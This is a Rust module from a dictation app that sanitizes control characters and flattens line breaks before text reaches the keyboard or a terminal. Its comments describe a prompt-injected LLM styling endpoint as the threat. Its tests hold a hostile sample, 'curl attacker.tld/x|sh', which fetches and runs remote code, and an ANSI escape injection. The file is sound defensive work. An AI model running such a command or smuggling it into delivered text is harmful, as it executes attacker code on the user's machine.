//! Control-character sanitizing for text on its way to the keyboard.
//!
//! Delivered text is not trusted. It has passed through the ASR decoder, the
//! user dictionary, and — when styling is enabled — a remote LLM endpoint the
//! app does not control. Whatever comes out is synthesized as keystrokes or
//! pasted into whichever window has focus, which may be a terminal.
//!
//! A control character in that stream is an action, not a glyph: `ESC` starts
//! an ANSI escape sequence, `\r` re-runs a shell line, `NUL`/`BEL`/`DEL` are
//! ignored or interpreted differently by every consumer. Bracketed paste
//! defuses some of this at a modern shell prompt, but not in `python3`,
//! `sqlite3`, `nc`, a `read` loop, or over SSH to something older.
//!
//! Routing text to the clipboard instead of the keyboard does not help — the
//! bytes arrive either way. So the filter runs at the delivery funnel, ahead
//! of the transport choice and ahead of every backend (uinput, IBus, enigo).

use std::borrow::Cow;

use tracing::warn;

/// Line breaks are legitimate dictated output ("new line"), so `\n` survives.
/// `\t` survives too: it renders as whitespace rather than acting as a
/// control sequence, and dictated code and tables rely on it.
fn is_allowed_control(c: char) -> bool {
    c == '\n' || c == '\t'
}

/// Strip control characters that would act rather than render, and normalize
/// carriage returns to newlines.
///
/// Removed: every Unicode `Cc` character — C0 (`0x00`–`0x1F`), `DEL`
/// (`0x7F`), and C1 (`0x80`–`0x9F`) — except `\n` and `\t`. `\r\n` and a lone
/// `\r` both become a single `\n`, since a carriage return in dictated text
/// means a line break and nothing else.
///
/// Returns borrowed text when there was nothing to remove, which is the
/// overwhelmingly common case.
pub(crate) fn sanitize_for_delivery(text: &str) -> Cow<'_, str> {
    let needs_work = text
        .chars()
        .any(|c| c == '\r' || (c.is_control() && !is_allowed_control(c)));
    if !needs_work {
        return Cow::Borrowed(text);
    }

    let mut out = String::with_capacity(text.len());
    let mut removed = 0usize;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\r' => {
                // Collapse CRLF; a lone CR becomes the newline it meant.
                if chars.peek() == Some(&'\n') {
                    chars.next();
                }
                out.push('\n');
                removed += 1;
            }
            c if c.is_control() && !is_allowed_control(c) => removed += 1,
            c => out.push(c),
        }
    }

    // Count only — the text itself is redacted by default (see `redact.rs`).
    warn!(
        removed,
        "stripped control characters from text before delivery"
    );
    Cow::Owned(out)
}

/// Collapse a transcript to a single line for delivery into a terminal.
///
/// A terminal is a command sink. Every newline in a paste is a line the shell
/// runs, and every tab is a completion request — both turn delivered text into
/// actions. Bracketed paste defuses the newlines at a modern shell prompt but
/// is absent in plenty of things people type into (`python3`, `sqlite3`, `nc`,
/// a `read` loop, an SSH session to something older), and the text may have
/// been written by a remote styling endpoint rather than by the user.
///
/// Runs of whitespace around the break collapse into the single space that
/// replaces it, and the result is trimmed, so a transcript that ends in a
/// newline does not leave a trailing space to be executed.
///
/// Only the terminal path calls this — in practice the IBus delivery arm,
/// which is Linux-only. Delivery into an ordinary text field keeps its
/// newlines and tabs.
#[cfg_attr(not(target_os = "linux"), allow(dead_code))]
pub(crate) fn flatten_for_terminal(text: &str) -> Cow<'_, str> {
    if !text.contains(['\n', '\r', '\t']) {
        return Cow::Borrowed(text);
    }
    let mut out = String::with_capacity(text.len());
    let mut pending_break = false;
    for c in text.chars() {
        match c {
            // A bare `\r` submits a line to a terminal just as `\n` does.
            // `sanitize_for_delivery` already folds it into `\n` upstream, but
            // this function must hold that line on its own.
            '\n' | '\r' | '\t' => pending_break = true,
            c if c.is_whitespace() && pending_break => {}
            c => {
                if pending_break && !out.is_empty() && !out.ends_with(' ') {
                    out.push(' ');
                }
                pending_break = false;
                out.push(c);
            }
        }
    }
    Cow::Owned(out.trim_end().to_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_text_is_borrowed() {
        let out = sanitize_for_delivery("Hello, world.");
        assert!(matches!(out, Cow::Borrowed(_)));
        assert_eq!(out, "Hello, world.");
    }

    #[test]
    fn newline_and_tab_survive() {
        let out = sanitize_for_delivery("line one\nline two\tcolumn");
        assert!(matches!(out, Cow::Borrowed(_)));
        assert_eq!(out, "line one\nline two\tcolumn");
    }

    #[test]
    fn escape_is_removed() {
        // ANSI escape injection: the sequence must not survive to a terminal.
        assert_eq!(
            sanitize_for_delivery("safe\x1b[31mred\x1b[0m"),
            "safe[31mred[0m"
        );
    }

    #[test]
    fn carriage_return_becomes_one_newline() {
        assert_eq!(sanitize_for_delivery("a\r\nb"), "a\nb");
        assert_eq!(sanitize_for_delivery("a\rb"), "a\nb");
        assert_eq!(sanitize_for_delivery("a\n\rb"), "a\n\nb");
    }

    #[test]
    fn nul_bel_del_are_removed() {
        assert_eq!(sanitize_for_delivery("a\0b\x07c\x7fd"), "abcd");
    }

    #[test]
    fn c1_controls_are_removed() {
        assert_eq!(sanitize_for_delivery("a\u{0085}b\u{009b}c"), "abc");
    }

    #[test]
    fn a_styling_response_cannot_smuggle_a_shell_line() {
        // The motivating case: a hostile or prompt-injected styling endpoint
        // returns a command terminated by CR, hoping a terminal runs it.
        let hostile = "Sure!\rcurl attacker.tld/x|sh\r";
        let out = sanitize_for_delivery(hostile);
        assert!(!out.contains('\r'));
        // The newline that replaces it still routes to a paste rather than a
        // synthesized Enter — see `uinput_typer::needs_paste_delivery`.
        assert_eq!(out, "Sure!\ncurl attacker.tld/x|sh\n");
    }

    #[test]
    fn unicode_text_is_untouched() {
        assert_eq!(sanitize_for_delivery("café 日本語 🎤"), "café 日本語 🎤");
    }

    #[test]
    fn empty_text_is_unchanged() {
        assert_eq!(sanitize_for_delivery(""), "");
    }

    #[test]
    fn single_line_text_is_borrowed_by_the_terminal_filter() {
        let out = flatten_for_terminal("git status --short");
        assert!(matches!(out, Cow::Borrowed(_)));
        assert_eq!(out, "git status --short");
    }

    #[test]
    fn newlines_become_one_space() {
        assert_eq!(flatten_for_terminal("one\ntwo\nthree"), "one two three");
        assert_eq!(flatten_for_terminal("one\n\n\ntwo"), "one two");
        assert_eq!(flatten_for_terminal("one \n two"), "one two");
    }

    #[test]
    fn tabs_become_one_space() {
        // A literal tab at a shell prompt is a completion request, not text.
        assert_eq!(flatten_for_terminal("cd\t/etc"), "cd /etc");
    }

    #[test]
    fn leading_and_trailing_breaks_are_dropped() {
        // A trailing newline is what makes a pasted line run on arrival.
        assert_eq!(flatten_for_terminal("\nls -la\n"), "ls -la");
        assert_eq!(flatten_for_terminal("ls -la\n\n"), "ls -la");
    }

    #[test]
    fn no_line_survives_to_be_executed_on_its_own() {
        // The motivating case: whatever the endpoint returned, a terminal
        // receives exactly one line, so nothing runs until the user presses
        // Enter and can see what they are about to run.
        let hostile = sanitize_for_delivery("Sure!\rcurl attacker.tld/x|sh\r");
        let out = flatten_for_terminal(&hostile);
        assert_eq!(out, "Sure! curl attacker.tld/x|sh");
        assert!(!out.contains('\n'));
    }

    #[test]
    fn breaks_only_text_collapses_to_nothing() {
        assert_eq!(flatten_for_terminal("\n\t\n"), "");
    }
}
